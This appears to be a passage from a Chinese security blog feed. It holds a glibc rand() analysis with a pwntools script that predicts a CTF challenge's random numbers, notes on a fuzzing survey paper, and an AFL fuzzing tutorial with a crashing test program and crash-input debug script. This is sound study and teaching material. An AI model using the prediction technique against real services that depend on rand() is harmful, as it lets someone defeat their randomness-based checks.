   if (buf-&gt;rand_type == TYPE_0)</span><br><span class="line">    &#123;</span><br><span class="line">        int32_t val = ((state[0] * 1103515245U) + 12345U) &amp; 0x7fffffff;</span><br><span class="line">        state[0] = val;</span><br><span class="line">        *result = val;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        int32_t *fptr = buf-&gt;fptr;</span><br><span class="line">        int32_t *rptr = buf-&gt;rptr;</span><br><span class="line">        int32_t *end_ptr = buf-&gt;end_ptr;</span><br><span class="line">        uint32_t val;</span><br><span class="line"></span><br><span class="line">        val = *fptr += (uint32_t)*rptr;</span><br><span class="line">        /* Chucking least random bit. */</span><br><span class="line">        *result = val &gt;&gt; 1;</span><br><span class="line">        ++fptr;</span><br><span class="line">        if (fptr &gt;= end_ptr)</span><br><span class="line">        &#123;</span><br><span class="line">            fptr = state;</span><br><span class="line">            ++rptr;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            ++rptr;</span><br><span class="line">            if (rptr &gt;= end_ptr)</span><br><span class="line">                rptr = state;</span><br><span class="line">        &#125;</span><br><span class="line">        buf-&gt;fptr = fptr;</span><br><span class="line">        buf-&gt;rptr = rptr;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line"></span><br><span class="line">fail:</span><br><span class="line">    __set_errno(EINVAL);</span><br><span class="line">    return -1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考注释可以得知 生成器有两种类型 TYPE_0是使用旧的线性同余法  另外一个则是使用精巧三项式算法<br>先来看较为简单的前者 state[0]指向randtbl数组的第二个元素 将其乘以1103515245 U代表无符号整数 随后加上12345 最后进行与运算<br>这里清空了符号位 并且只保留低31位<br>随后更新state[0]以及result</p><p>接下来看后者<br>开始先将结构体的成员赋值给对应的局部变量(下面 前指针和后指针所指向的数值 为了方便描述 均采用缩写为前后指针<br>接着将后指针加上前指针 其和重新赋值给了前指针以及val变量<br>随后的注释比较耐人寻味 其说舍弃最不随机的位<br>下一条指令对val右移了一位 相当于val除2 结果取整<br>这里说的最不随机的位指的是最低1位<br>就拿线性同余运算举例<br>其运算式为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">val = ((state[0] * 1103515245U) + 12345U) &amp; 0x7fffffff</span><br></pre></td></tr></table></figure><p>这里使用state[0]默认的值379960547代入<br>可以编写这样一个测试程序</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;signal.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">    int32_t state = 379960547;</span><br><span class="line">    int32_t val =0;</span><br><span class="line">    int time=1;</span><br><span class="line">    int bit =0;</span><br><span class="line">    for(int i=0;i&lt;20;i++)&#123;</span><br><span class="line">        val = ((state * 1103515245U) + 12345U) &amp; 0x7fffffff;</span><br><span class="line">        bit = val&amp;1;</span><br><span class="line">        state = val;</span><br><span class="line">        printf(&quot;count :%d ,val :%d,last bit: %d\n&quot;,time,val,bit);</span><br><span class="line">        time ++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后得到的结果为<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310312226443.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310312226443.png" alt="image.png"></a><br>可以看到最后一个bit为0和1交替 呈现出一定规律 所以称之为最不随机的位<br>说回正文 在进行了右移运算后 自增了前指针<br>如果前指针超过了数组的最后一个元素 那么就重置前指针 使其重新指向randtbl数组的第二个元素<br>如果没有超过 再自增后指针 如果后指针超过 那么就重置后指针 同上</p><h1 id="如何预测随机数"><a href="#如何预测随机数" class="headerlink" title="如何预测随机数"></a>如何预测随机数</h1><p>经过上面的源码分析<br>可以大概清楚随机数的生成逻辑<br>state数组从randtbl数组的第二个元素开始 也就是说state一共有31个元素<br>前指针初始指向s[3] (这里将state数组缩写成s)<br>后指针初始指向s[0]<br>那么我们这里就可以得到随机数数组o的第一个元素为<br>o[0] &#x3D; (s[3]+s[0])&gt;&gt;1<br>随后前指针和后指针均自增<br>随着推移 前指针会率先来到s数组的最后一个元素s[30]<br>根据源码推断 超过了s[30]后 就会重新赋值成s[0]<br>但是这里要注意 在随机数生成后 后指针与前指针之和会赋值给前指针<br>所以我们这里的s[?]只是一个代号 而非具体的值<br>也就是o[28] &#x3D; (s[0]+s[28])&gt;&gt;1<br>同理 o[31] &#x3D; (s[3]+s[0])&gt;&gt;1<br>如果拆分开成 s[3]&#x3D;s[3]+s[0],s[0] &#x3D; s[0]+s[28]<br>o[31]的值就有两种可能性<br>第一种为o[31] &#x3D; o[0]+o[28]<br>第二种为o[31] &#x3D; o[0]+o[28]+1<br>见下面表格</p><table><thead><tr><th>s[0]</th><th>s[3]</th><th>s[28]</th><th>o[31]</th></tr></thead><tbody><tr><td>奇</td><td>奇</td><td>奇</td><td>1</td></tr><tr><td>奇</td><td>奇</td><td>偶</td><td>1</td></tr><tr><td>奇</td><td>偶</td><td>奇</td><td>1</td></tr><tr><td>偶</td><td>奇</td><td>奇</td><td>2</td></tr><tr><td>奇</td><td>偶</td><td>偶</td><td>2</td></tr><tr><td>偶</td><td>偶</td><td>奇</td><td>1</td></tr><tr><td>偶</td><td>偶</td><td>偶</td><td>1</td></tr></tbody></table><p>可以看出是第一种可能性的概率为七分之五<br>也就是说 如果我们得到了o[0]和o[28] 我们就有比较大的概率预测出o[31]<br>同理 可以继续往下推  o[1]和o[29] 可得出o[32]等等<br>o[n] &#x3D; o[n-31]+o[n-3]或o[n] &#x3D; o[n-31]+o[n-3]+1<br>由于本人数学水平不高 所以无法想出怎么百分百预测 感兴趣的可以自己尝试(顺顺教教我</p><h1 id="实际演示"><a href="#实际演示" class="headerlink" title="实际演示"></a>实际演示</h1><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311041006599.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311041006599.png" alt="image.png"></a><br>以上面这题来举例 seed无法得知也无法覆盖<br>一共有101次机会<br>在猜数错误后 会提供正确的随机数<br>所以我们只需要保留o[0]和o[28]<br>就可以得出第32个随机数o[31]</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">o = []</span><br><span class="line">buf = 0</span><br><span class="line">for i in range(31):</span><br><span class="line">    io.recvuntil(&quot;Knowledge is power, not luck.\n&quot;)</span><br><span class="line">    io.sendline(b&#x27;0&#x27;)</span><br><span class="line">    io.recvuntil(&#x27;Here is some knowledge to help you become powerful...: &#x27;)</span><br><span class="line">    c = int(io.recvuntil(&quot;\n&quot;,drop = True))</span><br><span class="line">    o.append(c)</span><br><span class="line">buf = o[0]+o[28]</span><br><span class="line">print(buf)</span><br><span class="line">io.recvuntil(&quot;Knowledge is power, not luck.\n&quot;)</span><br><span class="line">io.sendline(str(buf))</span><br><span class="line">io.recv()</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311041009081.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202311041009081.png" alt="image.png"></a><br>成功得到正确的数值</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="extra" scheme="http://example.com/categories/extra/"/>
    
    
  </entry>
  
  <entry>
    <title>Fuzzing: Art, Science, and Engineering论文阅读</title>
    <link href="http://example.com/2023/10/17/fuzzing-art-science-and-engineering%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/"/>
    <id>http://example.com/2023/10/17/fuzzing-art-science-and-engineering%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/</id>
    <published>2023-10-17T09:13:39.000Z</published>
    <updated>2023-10-22T14:07:14.049Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>原论文地址:<a href="https://arxiv.org/pdf/1812.00140.pdf">https://arxiv.org/pdf/1812.00140.pdf</a><br>由于本人的英文水平实在是太垃圾了 所以用的是谷歌机翻看的<br>部分语句可能由于机翻带来的影响导致语义错误</p><h1 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h1><p>模糊测试是一种概念简单 部署门槛低 且成效显著的漏洞发现技术<br>本文的目的旨在帮助保存大量的模糊测试样例以及保证其连贯性 提出一个统一的通用模型</p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>作者简单介绍了fuzz是什么 以及此前其存在的缺陷 同时举了几个比赛队伍或者厂商使用FUZZ的案例  随后简要概括了fuzz社区的规模<br>因为fuzz的逐渐发展 导致了各种fuzz工具之间的术语存在明显的“歧义”(fragmentation)<br>作者认为 这种歧义很有可能会阻碍fuzz的传播  影响到fuzz的发展<br>所以 其认为有必要巩固和提炼模糊测试的进展 </p><h1 id="SYSTEMIZATION-TAXONOMY-AND-TEST-PRO-GRAMS"><a href="#SYSTEMIZATION-TAXONOMY-AND-TEST-PRO-GRAMS" class="headerlink" title="SYSTEMIZATION, TAXONOMY, AND TEST PRO-GRAMS"></a>SYSTEMIZATION, TAXONOMY, AND TEST PRO-GRAMS</h1><p>介绍了模糊测试最开始的提出者以及其最开始的定义 列举了模糊测试可适用的领域 接着为了使得大量模糊测试文献中的用语系统化 作者决定介绍一个由现代用途中提取的术语</p><h2 id="1-Fuzzing-Fuzz-Testing"><a href="#1-Fuzzing-Fuzz-Testing" class="headerlink" title="1.Fuzzing &amp; Fuzz Testing"></a>1.Fuzzing &amp; Fuzz Testing</h2><p>本小节针对模糊测试下了第一个定义</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Definition 1 (Fuzzing). Fuzzing is the execution of the PUTusing input(s) sampled from an input space (the “fuzz inputspace”) that protrudes the expected input space of the PUT.</span><br><span class="line">这里的put是program under test</span><br></pre></td></tr></table></figure><p>此外还针对fuzz testing和fuzz进行了一个定义<br>作者认为fuzz testing是一种利用fuzz的软件测试技术 其的特定目标是用来查找和安全有关的错误 包括程序崩溃</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Definition 2 (Fuzz Testing). Fuzz testing is the use of fuzzing</span><br><span class="line">to test if a PUT violates a security policy.</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Definition 3 (Fuzzer). A fuzzer is a program that performs</span><br><span class="line">fuzz testing on a PUT.</span><br></pre></td></tr></table></figure><p>此外还定义了fuzz compaign</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Definition 4 (Fuzz Campaign). A fuzz campaign is a specific</span><br><span class="line">execution of a fuzzer on a PUT with a specific security</span><br><span class="line">policy.</span><br></pre></td></tr></table></figure><p>早期的模糊测试活动 其安全策略只局限于测试输入 使PUT崩溃 但是模糊测试活动可以用于测试执行中观察到的任何安全策略 而这一决定执行是否违反安全策略的称为漏洞预测器</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Definition 5 (Bug Oracle). A bug oracle is a program, per-</span><br><span class="line">haps as part of a fuzzer, that determines whether a given</span><br><span class="line">execution of the PUT violates a specific security policy.</span><br></pre></td></tr></table></figure><p>这一段话有点没看懂 目前还不能理解执行中观察到的任何安全策略的含义 除了输入点可以诱发的崩溃 还有什么呢 笔者于这里提出了第一个疑问<br>作者称由模糊器实现的算法为模糊算法 模糊参数是依赖于PUT之外的一些参数 称其为模糊配置 笔者这里将其理解为 模糊参数于PUT不相干 是否可以认为是一种用于模糊测试的语料库</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Definition 6 (Fuzz Configuration). A fuzz configuration of</span><br><span class="line">a fuzz algorithm comprises the parameter value(s) that</span><br><span class="line">control(s) the fuzz algorithm.</span><br></pre></td></tr></table></figure><p>接着针对模糊算法进行了进一步的说明 作者认为模糊算法的定义是广泛的 复杂的模糊配置会随着时间的推移而演变其算法 引入了突变率和种子的概念<br>种子是用来生成输入PUT的测试用例<br>而种子的集合则成为种子池 复杂的模糊配置就会演变种子池<br>作者举了一个基于覆盖率引导的模糊测试例子 其会在每个配置中存储已经达到的覆盖率信息<br>笔者这里经过查阅资料(其实是询问gpt 大致了解了覆盖率是一种什么概念<br>覆盖率引导是一种模糊测试的技术策略 其主要目的是用来寻找最优的测试用例 该测试用例可以经过最多的代码分支 经过的代码占总代码的百分比就是覆盖率<br>那么这里就是一种迭代的过程 会根据上一次的模糊测试返回的覆盖率 来决定下一次的种子 从而使其获得更大的覆盖率</p><h2 id="2-Paper-Selection-Criteria"><a href="#2-Paper-Selection-Criteria" class="headerlink" title="2.Paper Selection Criteria"></a>2.Paper Selection Criteria</h2><p>这一小节 主要是作者声明了收纳出版物的范围 举了几个会议的名称<br>同时引入了黑盒白盒的概念(并未由作者提出 为笔者根据段落大意可以看出)<br>作者认为 以安全为特定目标的模糊测试和软件测试相比 从理论来说 二者的不同点只体现在漏洞预测器的区别(bug oracle)<br>接着作者提到 在实际中 软件测试的前提是知晓源代码 而且测试人对于PUT有更多的了解<br>而模糊测试更可能是被PUT开发者以外的人使用 其不知晓上述信息<br>由于这二者领域仍然密切相关 所以作者决定 只要出版物出现模糊(fuzz)一次 就纳入其中</p><h2 id="3-Fuzz-Testing-Algorithm"><a href="#3-Fuzz-Testing-Algorithm" class="headerlink" title="3.Fuzz Testing Algorithm"></a>3.Fuzz Testing Algorithm</h2><p>本节作者提供了一个算法1<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310192020010.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310192020010.png" alt="image.png"></a><br>其采用一组模糊配置C以及Tlimit(最大时间限制)作为输入<br>输出一组已发现的错误<br>其由两部分组成 第一部分为预处理(preprocess)函数构成 该函数在模糊测试开始时执行<br>第二部分为由五个功能组成的循环 但不是所有的模糊器都全是这五个功能<br>称这个循环的每次运行为模糊迭代 每次inputeval将模糊样例输入给PUT称为模糊运行</p><h3 id="PREPROCESS-C-C"><a href="#PREPROCESS-C-C" class="headerlink" title="PREPROCESS(C)-&gt;C"></a>PREPROCESS(C)-&gt;C</h3><p>用户向P提供一组模糊配置 其可能返回一组已修改的模糊配置<br>根据模糊算法的不同 P可以执行各种各样的操作 比如插入测试代码到PUT中<br>或者测量种子文件的执行速度</p><h3 id="SCHEDULE-C-Telapsed-Tlimit-conf"><a href="#SCHEDULE-C-Telapsed-Tlimit-conf" class="headerlink" title="SCHEDULE(C,Telapsed,Tlimit)-&gt;conf"></a>SCHEDULE(C,Telapsed,Tlimit)-&gt;conf</h3><p>将一组模糊配置C 最大时间限制 经过的时间作为参数输入 其会返回一个用于当前模糊迭代的模糊配置<br>这句话笔者有点没看懂 是意味着该功能负责实现模糊配置的迭代?<br>不过作者说详细看2.4节 所以这里暂且留一个疑问</p><h3 id="INPUTGEN-conf-tcs"><a href="#INPUTGEN-conf-tcs" class="headerlink" title="INPUTGEN(conf)-&gt;tcs"></a>INPUTGEN(conf)-&gt;tcs</h3><p>这个功能输入一个当前模糊配置 根据模糊器的不同 会选择模糊配置中的种子 又或者是模型或语法作为参数 以此来输出模糊测试的样例<br>笔者这里对于模型和语法是什么东西 还没有概念 先继续往下看</p><h3 id="INPUTEVAL-conf-tcs-0bug-B-execinfos"><a href="#INPUTEVAL-conf-tcs-0bug-B-execinfos" class="headerlink" title="INPUTEVAL(conf,tcs,0bug)-&gt;B,execinfos"></a>INPUTEVAL(conf,tcs,0bug)-&gt;B,execinfos</h3><p>接收当前模糊配置conf 模糊测试样例 以及漏洞预测器作为参数<br>该功能用于判断PUT是否违反了安全策略<br>结束后会输出一个漏洞合集B 以及execinfos 用来迭代模糊配置</p><h3 id="CONFUPDATE-C-conf-execinfos-C"><a href="#CONFUPDATE-C-conf-execinfos-C" class="headerlink" title="CONFUPDATE(C,conf,execinfos)-&gt;C"></a>CONFUPDATE(C,conf,execinfos)-&gt;C</h3><p>接收模糊配置C 当前模糊配置conf execinfos作为参数<br>该功能用来更新模糊配置C</p><h3 id="CONTINUE-C-True-False"><a href="#CONTINUE-C-True-False" class="headerlink" title="CONTINUE(C)-&gt;{True,False}"></a>CONTINUE(C)-&gt;{True,False}</h3><p>该功能用来接收当前模糊配置 并且进行判断是否进行模糊迭代<br>如果没有新的路径可发现 其就可以终止执行</p><h2 id="4-Taxonomy-of-Fuzzers"><a href="#4-Taxonomy-of-Fuzzers" class="headerlink" title="4.Taxonomy of Fuzzers"></a>4.Taxonomy of Fuzzers</h2><p>本节 作者对于模糊器的分类进行了定义 分为了三种 黑盒 白盒 灰盒<br>同时 这与传统的软件测试分类不同 灰盒是作为白盒的变体</p><h3 id="Black-box-Fuzzer"><a href="#Black-box-Fuzzer" class="headerlink" title="Black-box Fuzzer"></a>Black-box Fuzzer</h3><p>黑盒适用于模糊测试以及软件测试中 表示测试者无法看到PUT的内部结构 只能看到PUT的输入输出 大部分的模糊器都属于这一类<br>现代的部分模糊器 在考虑输入的结构信息以此来生成更有意义的测试样例的同时 也会保证不检查PUT</p><h3 id="White-box-Fuzzer"><a href="#White-box-Fuzzer" class="headerlink" title="White-box Fuzzer"></a>White-box Fuzzer</h3><p>白盒测试是指在进行模糊测试的时候 已经了解了PUT的内部结构和逻辑<br>接着作者提到 白盒测试一词最早的提及是动态符号执行DSE<br>普通的符号执行是指利用符号值而非输入值来分析执行路径<br>而动态符号执行中 符号执行和具体执行路径同时运行 根据PUT的状态和具体输入的数据来简化符号约束条件<br>在简化符号约束条件中 可以将符号值转化为具体的值 例如将符号执行的系统调用转化为实际的系统调用<br>上述的符号值表示的概念 按笔者的理解 应该是用例如符号’a’这样的字符来代替具体的值例如’6’ 类似于数学中一元方程的x<br>随后 作者还提到 白盒测试通常来用来描述污点分析的模糊器<br>笔者查询得知 污点分析中的污点是指不受信任的输入源进入PUT的数据 通常是用户输入<br>通过模糊器生成污点数据 可以模拟潜在的攻击场景 检测PUT是否在处理污点数据的时候存在安全隐患<br>作者提到 由于白盒测试需要进行动态检测和smt求解 所以相比黑盒测试 所需要的开销会更多</p><h3 id="Grey-box-Fuzzer"><a href="#Grey-box-Fuzzer" class="headerlink" title="Grey-box Fuzzer"></a>Grey-box Fuzzer</h3><p>灰盒测试位于白盒和黑盒之间  模糊器可以获得PUT的一部分内部信息<br>与白盒模糊器相比 灰盒不会推理PUT的完整语义<br>笔者认为 这里的完整语义是指 PUT的内部逻辑 数据流 控制流以及外部的交互等等<br>作者提到 灰盒测试可以对PUT进行轻量的静态分析或者收集其执行的动态信息 比如代码覆盖率</p><h2 id="5-Fuzzer-Genealogy-and-Overview"><a href="#5-Fuzzer-Genealogy-and-Overview" class="headerlink" title="5.Fuzzer Genealogy and Overview"></a>5.Fuzzer Genealogy and Overview</h2><p>暂时看不下去了 断更。。。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="extra" scheme="http://example.com/categories/extra/"/>
    
    
  </entry>
  
  <entry>
    <title>FUZZ学习</title>
    <link href="http://example.com/2023/10/17/fuzz%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2023/10/17/fuzz%E5%AD%A6%E4%B9%A0/</id>
    <published>2023-10-17T08:37:27.000Z</published>
    <updated>2023-11-20T02:59:52.151Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>对于FUZZ的大名早有耳闻 今天终于开始正式学习这一知识<br>水平有限 本篇文章可能部分地方存在描述错误等问题<br>本篇文章使用AFL模糊器</p><h1 id="什么是FUZZ"><a href="#什么是FUZZ" class="headerlink" title="什么是FUZZ"></a>什么是FUZZ</h1><p>为了弄清楚FUZZ的概念 拜读了《Fuzzing: Art, Science, and Engineering》这篇经典的论文 如果有想看我阅读后总结的 可以去看另外一篇博客 这里就简单概述<br>FUZZ相比传统的软件测试 其包含的漏洞预测器用于决定测试过程中是否违反了安全策略<br>二者的目的性不一样 而FUZZ又分为三种 白盒 黑盒 灰盒 三者最大的差别在于模糊器对于PUT(待测程序)的了解程度有多少 是否知晓PUT的内部逻辑等<br>FUZZ采用模糊算法来生成随机的测试样例 部分复杂的模糊配置可以演变种子池来迭代测试样例 通常依靠代码覆盖率(即PUT执行路径)</p><h1 id="配置FUZZ环境"><a href="#配置FUZZ环境" class="headerlink" title="配置FUZZ环境"></a>配置FUZZ环境</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://lcamtuf.coredump.cx/afl/releases/afl-latest.tgz</span><br><span class="line">tar xvf afl-latest.tgz</span><br><span class="line">cd afl-2.52b</span><br><span class="line">sudo make &amp;&amp; sudo make install</span><br></pre></td></tr></table></figure><p>上述是afl的安装 我个人建议是使用afl++ 不过本篇文章均采用afl<br>同时上述方式安装的afl版本是2.52 实际上最新的版本为2.57 需要去github上下载源代码后make编译 这里看各位的需求</p><h1 id="第一次FUZZ"><a href="#第一次FUZZ" class="headerlink" title="第一次FUZZ"></a>第一次FUZZ</h1><p>我们先来自己编写一个程序 逻辑很简单 输入对应的字符串就触发段错误</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;signal.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main(int argc, char *argv[]) &#123;</span><br><span class="line">    char buf[100];</span><br><span class="line">    scanf(&quot;%s&quot;,buf);</span><br><span class="line">    char buf1[] = &quot;aaaa&quot;;</span><br><span class="line">    if(!strcmp(buf,buf1))&#123;</span><br><span class="line">        printf(&quot;success!\n&quot;);</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        printf(&quot;faile\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>随便创建两个空目录 一个用来存放测试样例  一个用来存放输出信息<br>本次模糊测试 测试样例由我们自己填写<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242045496.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242045496.png" alt="image.png"></a><br>随后使用-i指定前者 -o指定后者 开始fuzz</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">afl-fuzz -i ./fuzz/in -o ./fuzz/out ./test</span><br></pre></td></tr></table></figure><p>当然了 如果你使用的是afl 那么你就会发现 模糊器读取到第二个样例的时候就终止了<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242047047.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242047047.png" alt="image.png"></a><br>原因在于afl的测试样例貌似不能直接导致PUT触发crash<br>所以这里更改第二个样例 使其为aaa 让模糊器使其迭代 延伸成aaaa这个字符串<br>随后重新开始fuzz 发现成功找到了三个crash<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242131457.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242131457.png" alt="image.png"></a></p><p>看到官方文档说 如果要让模糊器运行完毕 需要几个小时到一周左右 所以这里直接ctrl+c终止了<br>官方文档提到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crashes/ - unique test cases that cause the tested program to receive a fatal signal (e.g., SIGSEGV, SIGILL, SIGABRT). The entries are grouped by the received signal.</span><br></pre></td></tr></table></figure><p>所以去crashes目录下找到了三个触发崩溃的样例<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242131539.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242131539.png" alt="image.png"></a><br>第一个不出所料 是我们原定的字符串aaaa 第二个和第三个有点意外 貌似也是一些无规则字节 打算动调来看看 利用hexdump获取一下16进制格式的ascii字节码<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242151963.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242151963.png" alt="image.png"></a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\x68\x68\x68\x68\x32\x00\x00\x68\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xCE\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\x68\x87\x68\xE8\x00\x10\x68\x7F\xFF\xF0\xF0\xF0\xF0\xF0\xCF\xF0\xF0\xF0\xE4\xF0\xF0\xF0\x70\xF0\x68\x68\x68\x68\x32\x68\x68\x68\x68\x68\x68\xE8\x68\x68\x68\x68\xF0\xF0\xF0\xF0\xF0\xF0\xCF\xF0\xF0\xF0\xF0\x68\x68\xF0\xE9\xF0\xF0\xFB\xF0\xCF\xF0\xF0\xF0\xF0\xF0\xF0\x07\x70\xF0\x68\x68\x68\x68\x68\x68\x68\x6E\x00\x00\x01\x00\x70\xF0\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\xDF\xD1</span><br></pre></td></tr></table></figure><p>调试exp:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">io = process(&quot;./test&quot;)</span><br><span class="line">elf = ELF(&quot;./test&quot;)</span><br><span class="line">context.arch = &quot;amd64&quot;</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = &quot;\x68\x68\x68\x68\x32\x00\x00\x68\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xCE\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\x68\x87\x68\xE8\x00\x10\x68\x7F\xFF\xF0\xF0\xF0\xF0\xF0\xCF\xF0\xF0\xF0\xE4\xF0\xF0\xF0\x70\xF0\x68\x68\x68\x68\x32\x68\x68\x68\x68\x68\x68\xE8\x68\x68\x68\x68\xF0\xF0\xF0\xF0\xF0\xF0\xCF\xF0\xF0\xF0\xF0\x68\x68\xF0\xE9\xF0\xF0\xFB\xF0\xCF\xF0\xF0\xF0\xF0\xF0\xF0\x07\x70\xF0\x68\x68\x68\x68\x68\x68\x68\x6E\x00\x00\x01\x00\x70\xF0\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\xDF\xD1&quot;</span><br><span class="line">gdb.attach(io,&#x27;b *$rebase(0x1244)&#x27;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure><p>在程序执行到pthread_kill函数后 回溯一下执行流 发现了检查canary的函数<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242207740.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242207740.png" alt="image.png"></a><br>应该是由于栈溢出触发的crash<br>那么接下来来看第三个<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242208078.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242208078.png" alt="image.png"></a><br>看这个长度应该也是因为栈溢出导致的crash 那么这里就不进一步动调了</p><h1 id="黑盒测试以及读取文件内容"><a href="#黑盒测试以及读取文件内容" class="headerlink" title="黑盒测试以及读取文件内容"></a>黑盒测试以及读取文件内容</h1><p>本小节用来记录自己对于afl官方文档阅读后的理解和实操  没啥重要性<br>文档中粗略介绍了afl所采用的模糊算法<br>总结一下 可以得到下图<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310251248485.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310251248485.png" alt="image.png"></a><br>大体是和论文中描述的模糊器的五个功能大差不差<br>随后想要研究一下afl的黑盒测试功能  然后在配置环境的时候 不得不说是真的遇到一堆报错<br>首先进入下载的afl源码目录中的qemu-mode目录 运行build_qemu_support.sh</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd qemu-mode</span><br><span class="line">./build_qemu_support.sh</span><br></pre></td></tr></table></figure><p>这里我首先遇到的是下载qemu的网址报错404 但是也不是虚拟机代理问题 